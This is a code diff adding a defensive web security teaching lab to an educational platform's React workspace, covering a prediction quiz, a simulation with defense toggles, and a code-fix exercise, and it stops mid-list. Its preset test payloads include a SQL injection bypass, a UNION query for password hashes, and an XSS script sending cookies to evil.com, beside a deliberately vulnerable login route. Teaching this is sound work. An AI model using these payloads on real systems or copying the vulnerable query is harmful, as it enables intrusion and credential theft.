@@ -15,6 +15,7 @@ import {
   X,
 } from 'lucide-react';
 import { InMemoryDatabase } from '../db/in-memory-db';
+import { learningSessionService } from '../services/learningSessionService';
 import { LabAttemptRecord, LabLifecycleState } from '../types';
 import {
   NeuralNetworkSvg,
@@ -46,6 +47,10 @@ export const SharedLabWorkspace: React.FC<SharedLabWorkspaceProps> = ({
   onSelectCourse,
 }) => {
   const lab = useMemo(() => db.getLabBySlug(labSlug) || db.getLabDefinitions()[0], [db, labSlug]);
+
+  useEffect(() => {
+    learningSessionService.setDatabase(db);
+  }, [db]);
 
   // Shared lifecycle & submission state
   const [lifecycleState, setLifecycleState] = useState<LabLifecycleState>('ready');
@@ -113,12 +118,26 @@ export const SharedLabWorkspace: React.FC<SharedLabWorkspaceProps> = ({
   const [privacyMic, setPrivacyMic] = useState<boolean>(lab.initial_state.micShared ?? true);
   const [privacyAdTracking, setPrivacyAdTracking] = useState<boolean>(lab.initial_state.adTracking ?? true);
 
-  // Lab T5: Defensive Web Security Lab
+  // Lab T5: Defensive Web Security Lab (Phase 2 Vertical Slice)
+  const [secSessionId, setSecSessionId] = useState<string>(() => {
+    return lab.id === 'lab-t5-web-defense'
+      ? learningSessionService.startSession(currentUserId, lab.id)
+      : '';
+  });
+  const [secPredictionAnswer, setSecPredictionAnswer] = useState<string | null>(null);
+  const [secPredictionSubmitted, setSecPredictionSubmitted] = useState<boolean>(false);
   const [secParamQueries, setSecParamQueries] = useState<boolean>(lab.initial_state.parameterizedQueries ?? false);
   const [secOutputEncoding, setSecOutputEncoding] = useState<boolean>(lab.initial_state.outputEncoding ?? false);
   const [secCsp, setSecCsp] = useState<boolean>(lab.initial_state.cspEnabled ?? false);
   const [secQueryInput, setSecQueryInput] = useState<string>(lab.initial_state.userQueryInput || "' OR '1'='1");
+  const [secIsSimulating, setSecIsSimulating] = useState<boolean>(false);
+  const [secSimulationRan, setSecSimulationRan] = useState<boolean>(false);
+  const [secReducedMotion, setSecReducedMotion] = useState<boolean>(false);
   const [secExecutionLog, setSecExecutionLog] = useState<string[]>([]);
+  const [secDiagnosticAnswer, setSecDiagnosticAnswer] = useState<string | null>(null);
+  const [secDiagnosticSubmitted, setSecDiagnosticSubmitted] = useState<boolean>(false);
+  const [secExplanationAnswer, setSecExplanationAnswer] = useState<string | null>(null);
+  const [secExplanationSubmitted, setSecExplanationSubmitted] = useState<boolean>(false);
 
   // Lab T6: Microsoft Productivity Exercise
   const [prodFormulaSum, setProdFormulaSum] = useState<string>('');
@@ -604,37 +623,174 @@ export const SharedLabWorkspace: React.FC<SharedLabWorkspaceProps> = ({
     }
   }, [privacyScore, privacyLocation, privacyContacts, lab.id]);
 
+  // Lab T5: Draft Hydration on Mount
+  useEffect(() => {
+    if (lab.id === 'lab-t5-web-defense') {
+      const draft = learningSessionService.loadDraft(currentUserId, lab.id);
+      if (draft) {
+        if (draft.sessionId) setSecSessionId(draft.sessionId);
+        if (draft.predictionAnswer !== undefined) setSecPredictionAnswer(draft.predictionAnswer);
+        if (draft.predictionSubmitted !== undefined) setSecPredictionSubmitted(draft.predictionSubmitted);
+        if (draft.secParamQueries !== undefined) setSecParamQueries(draft.secParamQueries);
+        if (draft.secOutputEncoding !== undefined) setSecOutputEncoding(draft.secOutputEncoding);
+        if (draft.secCsp !== undefined) setSecCsp(draft.secCsp);
+        if (draft.secQueryInput !== undefined) setSecQueryInput(draft.secQueryInput);
+        if (draft.diagnosticAnswer !== undefined) setSecDiagnosticAnswer(draft.diagnosticAnswer);
+        if (draft.diagnosticSubmitted !== undefined) setSecDiagnosticSubmitted(draft.diagnosticSubmitted);
+        if (draft.explanationAnswer !== undefined) setSecExplanationAnswer(draft.explanationAnswer);
+        if (draft.explanationSubmitted !== undefined) setSecExplanationSubmitted(draft.explanationSubmitted);
+        setSaveStatus('LOCAL DRAFT');
+      }
+    }
+  }, [lab.id, currentUserId]);
+
   // Defensive Web Security evaluation
   const handleRunSecurityTests = () => {
     setLifecycleState('running');
+    setSecIsSimulating(true);
     const logs: string[] = [];
 
     // Test 1: SQL Injection
     if (secParamQueries) {
-      logs.push('✓ SQL INJECTION MITIGATED: Query parameterized. Input treated as literal data, preventing statement breakout.');
+      logs.push('✓ SQL INJECTION MITIGATED: Query parameterized with bind tokens. Input treated as literal data, preventing AST breakout.');
     } else {
-      logs.push('✕ CRITICAL VULNERABILITY: Raw input concatenated into SQL string. Malicious WHERE condition evaluated.');
+      logs.push('✕ CRITICAL VULNERABILITY (CWE-89): Raw input concatenated into SQL string. Malicious WHERE condition evaluated to bypass authentication.');
     }
 
     // Test 2: XSS
     if (secOutputEncoding) {
       logs.push('✓ XSS DEFENSE ACTIVE: Input entity-encoded (&lt;script&gt;). Browser renders text instead of executing script.');
     } else {
-      logs.push('✕ HIGH RISK: Raw unencoded input echoed to DOM. Reflected script execution permitted.');
+      logs.push('✕ HIGH RISK (CWE-79): Raw unencoded input echoed to DOM. Reflected script execution permitted.');
     }
 
+    // Test 3: CSP
     if (secCsp) {
-      logs.push('✓ CSP HEADER ENFORCED: script-src \'self\'; disallows inline script execution.');
+      logs.push("✓ CSP HEADER ENFORCED: script-src 'self'; disallows inline script execution.");
+    } else {
+      logs.push('! WARNING: CSP missing or unguarded. Inline scripts permitted if injection occurs.');
     }
 
     setSecExecutionLog(logs);
+    setSecSimulationRan(true);
     setLifecycleState('ready');
+    setTimeout(() => setSecIsSimulating(false), 500);
 
-    const next = [...checkedCriteria];
-    if (secParamQueries) next[0] = true;
-    if (secOutputEncoding) next[1] = true;
-    if (secParamQueries && secOutputEncoding) next[2] = true;
-    setCheckedCriteria(next);
+    // Route event through session service
+    if (secSessionId) {
+      learningSessionService.emitEvent({
+        sessionId: secSessionId,
+        userId: currentUserId,
+        labId: lab.id,
+        eventType: 'SIMULATION_EXECUTED',
+        payload: {
+          paramQueries: secParamQueries,
+          outputEncoding: secOutputEncoding,
+          strictCsp: secCsp,
+          payload: secQueryInput,
+        },
+        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:SIM_${Date.now()}`,
+      }).catch(() => {});
+    }
+  };
+
+  // Lab T5 Criteria & Draft Auto-Sync
+  useEffect(() => {
+    if (lab.id === 'lab-t5-web-defense') {
+      const next = [false, false, false, false];
+      if (secPredictionSubmitted && secPredictionAnswer === 'ast_mutation') next[0] = true;
+      if (secSimulationRan && secParamQueries && secOutputEncoding) next[1] = true;
+      if (secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement') next[2] = true;
+      if (secExplanationSubmitted && secExplanationAnswer === 'ast_precompile') next[3] = true;
+      setCheckedCriteria(next);
+
+      learningSessionService.saveDraft(currentUserId, lab.id, {
+        sessionId: secSessionId,
+        labId: lab.id,
+        userId: currentUserId,
+        predictionAnswer: secPredictionAnswer,
+        predictionSubmitted: secPredictionSubmitted,
+        secQueryInput,
+        secParamQueries,
+        secOutputEncoding,
+        secCsp,
+        diagnosticAnswer: secDiagnosticAnswer,
+        diagnosticSubmitted: secDiagnosticSubmitted,
+        explanationAnswer: secExplanationAnswer,
+        explanationSubmitted: secExplanationSubmitted,
+        lastSaved: new Date().toISOString(),
+      });
+      setSaveStatus('LOCAL DRAFT');
+    }
+  }, [
+    lab.id,
+    currentUserId,
+    secSessionId,
+    secPredictionAnswer,
+    secPredictionSubmitted,
+    secSimulationRan,
+    secParamQueries,
+    secOutputEncoding,
+    secCsp,
+    secQueryInput,
+    secDiagnosticAnswer,
+    secDiagnosticSubmitted,
+    secExplanationAnswer,
+    secExplanationSubmitted,
+  ]);
+
+  const handleLockPrediction = () => {
+    if (!secPredictionAnswer) return;
+    setSecPredictionSubmitted(true);
+    if (secSessionId) {
+      learningSessionService.emitEvent({
+        sessionId: secSessionId,
+        userId: currentUserId,
+        labId: lab.id,
+        eventType: 'PREDICTION_SUBMITTED',
+        payload: {
+          answer: secPredictionAnswer,
+          isCorrect: secPredictionAnswer === 'ast_mutation',
+        },
+        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:PRED_LOCK`,
+      }).catch(() => {});
+    }
+  };
+
+  const handleVerifyDiagnostic = () => {
+    if (!secDiagnosticAnswer) return;
+    setSecDiagnosticSubmitted(true);
+    if (secSessionId) {
+      learningSessionService.emitEvent({
+        sessionId: secSessionId,
+        userId: currentUserId,
+        labId: lab.id,
+        eventType: 'DIAGNOSTIC_COMPLETED',
+        payload: {
+          codeFixId: secDiagnosticAnswer,
+          isCorrect: secDiagnosticAnswer === 'prepared_statement',
+        },
+        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:DIAG_LOCK`,
+      }).catch(() => {});
+    }
+  };
+
+  const handleVerifyExplanation = () => {
+    if (!secExplanationAnswer) return;
+    setSecExplanationSubmitted(true);
+    if (secSessionId) {
+      learningSessionService.emitEvent({
+        sessionId: secSessionId,
+        userId: currentUserId,
+        labId: lab.id,
+        eventType: 'EXPLANATION_VERIFIED',
+        payload: {
+          reasoningId: secExplanationAnswer,
+          isCorrect: secExplanationAnswer === 'ast_precompile',
+        },
+        idempotencyKey: `${currentUserId}:${lab.id}:${secSessionId}:EXPL_LOCK`,
+      }).catch(() => {});
+    }
   };
 
   // Microsoft Productivity Formula verification
@@ -783,6 +939,21 @@ export const SharedLabWorkspace: React.FC<SharedLabWorkspaceProps> = ({
       setPrivacyContacts(true);
       setSecParamQueries(false);
       setSecOutputEncoding(false);
+      setSecCsp(false);
+      setSecQueryInput("' OR '1'='1");
+      setSecExecutionLog([]);
+      setSecPredictionAnswer(null);
+      setSecPredictionSubmitted(false);
+      setSecSimulationRan(false);
+      setSecDiagnosticAnswer(null);
+      setSecDiagnosticSubmitted(false);
+      setSecExplanationAnswer(null);
+      setSecExplanationSubmitted(false);
+      if (lab.id === 'lab-t5-web-defense') {
+        learningSessionService.clearDraft(currentUserId, lab.id);
+        const newSession = learningSessionService.startSession(currentUserId, lab.id);
+        setSecSessionId(newSession);
+      }
       setProdFormulaSum('');
       setProdFormulaAvg('');
       setFinScenario('expansion');
@@ -799,12 +970,53 @@ export const SharedLabWorkspace: React.FC<SharedLabWorkspaceProps> = ({
   };
 
   // Submit and verify attempt in database
-  const handleSubmitAttempt = () => {
+  const handleSubmitAttempt = async () => {
     const passedCount = checkedCriteria.filter(Boolean).length;
     const score = Math.round((passedCount / lab.validation_criteria.length) * 100);
     const passed = score >= lab.completion_threshold;
 
     try {
+      if (lab.id === 'lab-t5-web-defense') {
+        const { record } = await learningSessionService.submitAttempt(currentUserId, lab.id, secSessionId, {
+          passed,
+          score,
+          diagnostics: passed
+            ? `Verified complete. All 4 pedagogical stages validated: Prediction, Defense Pipeline, Parameterized Refactoring, and Wire-Level AST Explanation.`
+            : `Partial completion: ${passedCount}/4 criteria met. Passing threshold is ${lab.completion_threshold}%.`,
+          evidence: {
+            prediction: {
+              answer: secPredictionAnswer || '',
+              isCorrect: secPredictionAnswer === 'ast_mutation',
+              timestamp: new Date().toISOString(),
+            },
+            simulation: {
+              paramQueries: secParamQueries,
+              outputEncoding: secOutputEncoding,
+              strictCsp: secCsp,
+              payloadTested: secQueryInput,
+              defensePassRate: secParamQueries && secOutputEncoding ? 100 : 50,
+              timestamp: new Date().toISOString(),
+            },
+            diagnostic: {
+              codeFixId: secDiagnosticAnswer || '',
+              isCorrect: secDiagnosticAnswer === 'prepared_statement',
+              timestamp: new Date().toISOString(),
+            },
+            explanation: {
+              reasoningId: secExplanationAnswer || '',
+              isCorrect: secExplanationAnswer === 'ast_precompile',
+              timestamp: new Date().toISOString(),
+            },
+          },
+        });
+
+        setCompletedAttempt(record);
+        setLifecycleState(passed ? 'success' : 'incorrect');
+        setSaveStatus('SAVED');
+        return;
+      }
+
+      // Default database recording for other labs
       const record = db.recordLabAttempt(currentUserId, lab.id, {
         passed,
         score,
@@ -1517,82 +1729,707 @@ export const SharedLabWorkspace: React.FC<SharedLabWorkspaceProps> = ({
           {/* -------------------------------------------------------- */}
           {/* LAB ENGINE 5: DEFENSIVE WEB SECURITY LAB                 */}
           {/* -------------------------------------------------------- */}
+          {/* -------------------------------------------------------- */}
+          {/* LAB ENGINE 5: DEFENSIVE WEB SECURITY (Gate 2 Slice)       */}
+          {/* -------------------------------------------------------- */}
           {lab.id === 'lab-t5-web-defense' && (
-            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
-              <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
-                Web Security Defense Interception Pipeline
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
+              {/* Header Context & Accessibility Control */}
+              <div
+                className="card"
+                style={{
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'space-between',
+                  flexWrap: 'wrap',
+                  gap: '12px',
+                  backgroundColor: 'var(--bg-surface)',
+                  border: '1px solid var(--border-subtle)',
+                }}
+              >
+                <div>
+                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
+                    Web Security Defense &amp; Query Interception Pipeline
+                  </div>
+                  <div style={{ fontSize: '0.82rem', color: 'var(--text-secondary)', marginTop: '2px' }}>
+                    Vertical Pedagogical Slice: Prediction &rarr; Simulation &rarr; Diagnostic Code Refactoring &rarr; AST Wire Explanation
+                  </div>
+                </div>
+
+                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                  <button
+                    type="button"
+                    onClick={() => setSecReducedMotion((prev) => !prev)}
+                    className="btn-secondary"
+                    style={{ height: '32px', fontSize: '0.75rem', padding: '0 10px' }}
+                    aria-pressed={secReducedMotion}
+                    title="Toggle reduced motion for animations"
+                  >
+                    <span>{secReducedMotion ? 'Motion: Reduced' : 'Motion: Animated'}</span>
+                  </button>
+                  <span
+                    style={{
+                      fontSize: '0.75rem',
+                      fontFamily: 'var(--font-mono)',
+                      padding: '4px 8px',
+                      borderRadius: '6px',
+                      backgroundColor: 'var(--bg-canvas)',
+                      border: '1px solid var(--border-subtle)',
+                      color: 'var(--text-secondary)',
+                    }}
+                  >
+                    Session: {secSessionId ? secSessionId.substring(0, 8) + '...' : 'active'}
+                  </span>
+                </div>
               </div>
 
-              {/* Real-time SVG Security Pipeline */}
-              <SecurityPipelineSvg
-                paramQueries={secParamQueries}
-                outputEncoding={secOutputEncoding}
-                strictCsp={secCsp}
-              />
+              {/* ============================================================== */}
+              {/* STAGE 1: MEANINGFUL ARCHITECTURAL PREDICTION CHALLENGE          */}
+              {/* ============================================================== */}
+              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span
+                      style={{
+                        fontSize: '0.72rem',
+                        fontWeight: 800,
+                        backgroundColor: secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--accent-primary)',
+                        color: '#FFFFFF',
+                        padding: '2px 8px',
+                        borderRadius: '12px',
+                        letterSpacing: '0.04em',
+                      }}
+                    >
+                      STAGE 1
+                    </span>
+                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
+                      Architectural Prediction Challenge
+                    </span>
+                  </div>
+                  <span style={{ fontSize: '0.78rem', color: secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
+                    {secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' ? '✓ Stage Verified' : 'Action Required'}
+                  </span>
+                </div>
 
-              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
-                <label style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-secondary)' }}>
-                  Simulated Untrusted Input Payload
-                </label>
-                <input
-                  type="text"
-                  value={secQueryInput}
-                  onChange={(e) => setSecQueryInput(e.target.value)}
-                  className="form-input"
-                  style={{ fontFamily: 'var(--font-mono)' }}
+                <p style={{ fontSize: '0.88rem', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
+                  Before testing in the interactive sandbox, analyze the attacker&apos;s exploit payload:
+                  When an attacker supplies the input <code>&apos; OR &apos;1&apos;=&apos;1</code> into a query constructed via direct string concatenation (<code>&quot;SELECT * FROM users WHERE email = &apos;&quot; + input + &quot;&apos;&quot;</code>), what fundamental operation occurs at the database parser level?
+                </p>
+
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                  {[
+                    {
+                      id: 'ast_mutation',
+                      text: "The lexical analyzer splits the input into language tokens (OR, literal '1', equals operator, literal '1'), fundamentally mutating the query's Abstract Syntax Tree (AST) so the WHERE condition permanently evaluates to TRUE.",
+                    },
+                    {
+                      id: 'lexer_error',
+                      text: 'The database parser immediately throws an unhandled syntax error and terminates execution because string literals cannot contain single apostrophes.',
+                    },
+                    {
+                      id: 'auto_escape',
+                      text: 'The database server engine automatically detects apostrophes in untrusted data and applies escaping without developer configuration.',
+                    },
+                    {
+                      id: 'waf_drop',
+                      text: 'The Node.js HTTP server detects the payload string and drops the TCP socket before transmitting the query over the wire.',
+                    },
+                  ].map((option) => (
+                    <label
+                      key={option.id}
+                      style={{
+                        display: 'flex',
+                        alignItems: 'flex-start',
+                        gap: '10px',
+                        padding: '12px',
+                        borderRadius: '8px',
+                        border: secPredictionAnswer === option.id ? '2px solid var(--accent-primary)' : '1px solid var(--border-subtle)',
+                        backgroundColor: secPredictionAnswer === option.id ? 'rgba(36, 76, 58, 0.04)' : 'var(--bg-surface)',
+                        cursor: secPredictionSubmitted ? 'default' : 'pointer',
+                        fontSize: '0.85rem',
+                        lineHeight: 1.45,
+                      }}
+                    >
+                      <input
+                        type="radio"
+                        name="secPredictionOption"
+                        checked={secPredictionAnswer === option.id}
+                        disabled={secPredictionSubmitted}
+                        onChange={() => setSecPredictionAnswer(option.id)}
+                        style={{ marginTop: '3px' }}
+                      />
+                      <span>{option.text}</span>
+                    </label>
+                  ))}
+                </div>
+
+                {!secPredictionSubmitted ? (
+                  <div>
+                    <button
+                      type="button"
+                      onClick={handleLockPrediction}
+                      disabled={!secPredictionAnswer}
+                      className="btn-primary"
+                      style={{ height: '36px', padding: '0 16px', opacity: secPredictionAnswer ? 1 : 0.5 }}
+                    >
+                      Lock In Architectural Prediction
+                    </button>
+                  </div>
+                ) : (
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                    <div
+                      style={{
+                        padding: '12px 14px',
+                        borderRadius: '8px',
+                        backgroundColor: secPredictionAnswer === 'ast_mutation' ? 'rgba(22, 163, 74, 0.1)' : 'rgba(239, 68, 68, 0.1)',
+                        border: `1px solid ${secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--danger)'}`,
+                        fontSize: '0.84rem',
+                        lineHeight: 1.5,
+                      }}
+                    >
+                      <div style={{ fontWeight: 700, color: secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--danger)', marginBottom: '4px' }}>
+                        {secPredictionAnswer === 'ast_mutation' ? '✓ Correct Architectural Insight' : '✕ Flawed Prediction'}
+                      </div>
+                      <div style={{ color: 'var(--text-primary)' }}>
+                        {secPredictionAnswer === 'ast_mutation'
+                          ? "Direct string concatenation forces the database parser to treat incoming characters as language keywords. Because the parser cannot distinguish developer-intended grammar from untrusted user text, the WHERE clause's AST branch evaluates as TRUE for every table row."
+                          : "Direct string concatenation does NOT produce automatic escaping or connection dropping. The database parser faithfully parses untrusted input into active SQL grammar nodes, mutating the AST logic."}
+                      </div>
+                    </div>
+
+                    {secPredictionAnswer !== 'ast_mutation' && (
+                      <div>
+                        <button
+                          type="button"
+                          onClick={() => setSecPredictionSubmitted(false)}
+                          className="btn-secondary"
+                          style={{ height: '32px', padding: '0 14px', fontSize: '0.8rem' }}
+                        >
+                          Revise &amp; Retry Prediction
+                        </button>
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+
+              {/* ============================================================== */}
+              {/* STAGE 2: FUNCTIONING INTERACTIVE SIMULATION (Defense Pipeline) */}
+              {/* ============================================================== */}
+              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span
+                      style={{
+                        fontSize: '0.72rem',
+                        fontWeight: 800,
+                        backgroundColor: secSimulationRan && secParamQueries && secOutputEncoding ? 'var(--success)' : 'var(--accent-primary)',
+                        color: '#FFFFFF',
+                        padding: '2px 8px',
+                        borderRadius: '12px',
+                        letterSpacing: '0.04em',
+                      }}
+                    >
+                      STAGE 2
+                    </span>
+                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
+                      Interactive Defense-in-Depth Pipeline Simulation
+                    </span>
+                  </div>
+                  <span style={{ fontSize: '0.78rem', color: secSimulationRan && secParamQueries && secOutputEncoding ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
+                    {secSimulationRan && secParamQueries && secOutputEncoding ? '✓ Pipeline Hardened' : 'Configuration Required'}
+                  </span>
+                </div>
+
+                {/* Real-time SVG Security Pipeline */}
+                <SecurityPipelineSvg
+                  paramQueries={secParamQueries}
+                  outputEncoding={secOutputEncoding}
+                  strictCsp={secCsp}
+                  payload={secQueryInput}
+                  isSimulating={secIsSimulating}
+                  forceReducedMotion={secReducedMotion}
                 />
+
+                {/* Preset Attack Vectors */}
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                  <label style={{ fontSize: '0.82rem', fontWeight: 600, color: 'var(--text-secondary)' }}>
+                    Quick-Load Test Payloads:
+                  </label>
+                  <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
+                    {[
+                      { label: "SQL Auth Bypass (' OR '1'='1)", payload: "' OR '1'='1" },
+                      { label: "SQL Union Exfiltration", payload: "' UNION SELECT 1, email, password_hash FROM admin_users --" },
+                      { label: "XSS Reflected Script", payload: "<script>fetch('http://evil.com/leak?c=' + document.cookie)</script>" },
+                      { label: "Benign Valid Email", payload: "student.dev@geniusphere.org" },
+                    ].map((preset, idx) => (
+                      <button
+                        key={idx}
+                        type="button"
+                        onClick={() => setSecQueryInput(preset.payload)}
+                        className="btn-secondary"
+                        style={{ height: '30px', fontSize: '0.76rem', padding: '0 10px' }}
+                      >
+                        {preset.label}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Input Field */}
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                  <label style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-secondary)' }}>
+                    Simulated Untrusted Input Payload
+                  </label>
+                  <input
+                    type="text"
+                    value={secQueryInput}
+                    onChange={(e) => setSecQueryInput(e.target.value)}
+                    className="form-input"
+                    style={{ fontFamily: 'var(--font-mono)', fontSize: '0.85rem' }}
+                  />
+                </div>
+
+                {/* Defense Gates Toggles */}
+                <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap' }}>
+                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
+                    <input
+                      type="checkbox"
+                      checked={secParamQueries}
+                      onChange={(e) => setSecParamQueries(e.target.checked)}
+                    />
+                    <span style={{ fontWeight: 600 }}>Enable Parameterized Queries (?)</span>
+                  </label>
+
+                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
+                    <input
+                      type="checkbox"
+                      checked={secOutputEncoding}
+                      onChange={(e) => setSecOutputEncoding(e.target.checked)}
+                    />
+                    <span style={{ fontWeight: 600 }}>Enable Context-Aware HTML Encoding</span>
+                  </label>
+
+                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
+                    <input
+                      type="checkbox"
+                      checked={secCsp}
+                      onChange={(e) => setSecCsp(e.target.checked)}
+                    />
+                    <span style={{ fontWeight: 600 }}>Enable Strict CSP</span>
+                  </label>
+                </div>
+
+                <div>
+                  <button
+                    type="button"
+                    onClick={handleRunSecurityTests}
+                    className="btn-primary"
+                    style={{ height: '38px', padding: '0 18px' }}
+                  >
+                    <Play size={15} />
+                    <span>Execute Security Diagnostic</span>
+                  </button>
+                </div>
+
+                {secExecutionLog.length > 0 && (
+                  <div
+                    style={{
+                      backgroundColor: 'var(--editor-bg)',
+                      border: '1px solid var(--border-subtle)',
+                      borderRadius: '8px',
+                      padding: '14px',
+                      display: 'flex',
+                      flexDirection: 'column',
+                      gap: '6px',
+                      fontFamily: 'var(--font-mono)',
+                      fontSize: '0.82rem',
+                    }}
+                    role="log"
+                    aria-label="Security Pipeline Diagnostic Log"
+                  >
+                    {secExecutionLog.map((log, i) => (
+                      <div key={i} style={{ color: log.startsWith('✓') ? 'var(--success)' : log.startsWith('!') ? '#F59E0B' : 'var(--danger)' }}>
+                        {log}
+                      </div>
+                    ))}
+                  </div>
+                )}
               </div>
 
-              <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap' }}>
-                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
-                  <input
-                    type="checkbox"
-                    checked={secParamQueries}
-                    onChange={(e) => setSecParamQueries(e.target.checked)}
-                  />
-                  <span style={{ fontWeight: 600 }}>Enable Parameterized Queries (?)</span>
-                </label>
+              {/* ============================================================== */}
+              {/* STAGE 3: DEBUGGING & DIAGNOSTIC CODE REFACTORING EXERCISE      */}
+              {/* ============================================================== */}
+              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span
+                      style={{
+                        fontSize: '0.72rem',
+                        fontWeight: 800,
+                        backgroundColor: secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--accent-primary)',
+                        color: '#FFFFFF',
+                        padding: '2px 8px',
+                        borderRadius: '12px',
+                        letterSpacing: '0.04em',
+                      }}
+                    >
+                      STAGE 3
+                    </span>
+                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
+                      Diagnostic Code Refactoring Exercise
+                    </span>
+                  </div>
+                  <span style={{ fontSize: '0.78rem', color: secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
+                    {secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' ? '✓ Stage Verified' : 'Action Required'}
+                  </span>
+                </div>
 
-                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
-                  <input
-                    type="checkbox"
-                    checked={secOutputEncoding}
-                    onChange={(e) => setSecOutputEncoding(e.target.checked)}
-                  />
-                  <span style={{ fontWeight: 600 }}>Enable Context-Aware HTML Encoding</span>
-                </label>
+                <p style={{ fontSize: '0.88rem', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
+                  Inspect this vulnerable Express.js authentication route handler. Direct string concatenation creates a critical CWE-89 vulnerability:
+                </p>
 
-                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
-                  <input
-                    type="checkbox"
-                    checked={secCsp}
-                    onChange={(e) => setSecCsp(e.target.checked)}
-                  />
-                  <span style={{ fontWeight: 600 }}>Enable Strict CSP</span>
-                </label>
-              </div>
-
-              <div>
-                <button
-                  type="button"
-                  onClick={handleRunSecurityTests}
-                  className="btn-primary"
-                  style={{ height: '38px', padding: '0 18px' }}
+                {/* Monospace Code Display */}
+                <div
+                  style={{
+                    backgroundColor: 'var(--editor-bg)',
+                    border: '1px solid var(--border-subtle)',
+                    borderRadius: '8px',
+                    padding: '14px',
+                    fontFamily: 'var(--font-mono)',
+                    fontSize: '0.82rem',
+                    color: 'var(--text-primary)',
+                    lineHeight: 1.5,
+                  }}
                 >
-                  <Play size={15} />
-                  <span>Execute Security Diagnostic</span>
-                </button>
+                  <div style={{ color: '#6B7280' }}>// Insecure Express Endpoint Handler</div>
+                  <div>app.post(&apos;/api/v1/auth/login&apos;, async (req, res) =&gt; &#123;</div>
+                  <div style={{ paddingLeft: '16px' }}>const &#123; email, password &#125; = req.body;</div>
+                  <div style={{ paddingLeft: '16px', color: 'var(--danger)', backgroundColor: 'rgba(239, 68, 68, 0.08)' }}>
+                    // VULNERABLE: Direct string concatenation allows AST injection
+                  </div>
+                  <div style={{ paddingLeft: '16px', color: 'var(--danger)' }}>
+                    const sql = &quot;SELECT id, email, role FROM users WHERE email = &apos;&quot; + email + &quot;&apos; AND password = &apos;&quot; + password + &quot;&apos;&quot;;
+                  </div>
+                  <div style={{ paddingLeft: '16px' }}>const user = await rawDbQuery(sql);</div>
+                  <div style={{ paddingLeft: '16px' }}>return res.json(user);</div>
+                  <div>&#125;);</div>
+                </div>
+
+                <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-primary)' }}>
+                  Select the secure production-grade implementation:
+                </div>
+
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                  {[
+                    {
+                      id: 'prepared_statement',
+                      title: 'Option A: Parameterized Prepared Statement (?)',
+                      code: 'const sql = "SELECT id, email, role FROM users WHERE email = ? AND password = ?";\nconst user = await db.query(sql, [email, password]);',
+                    },
+                    {
+                      id: 'client_replace',
+                      title: 'Option B: Escape Single Quotes via Replace',
+                      code: "const safeEmail = email.replace(/'/g, \"''\");\nconst sql = \"SELECT id, email, role FROM users WHERE email = '\" + safeEmail + \"'\";",
+                    },
+                    {
+                      id: 'regex_strip',
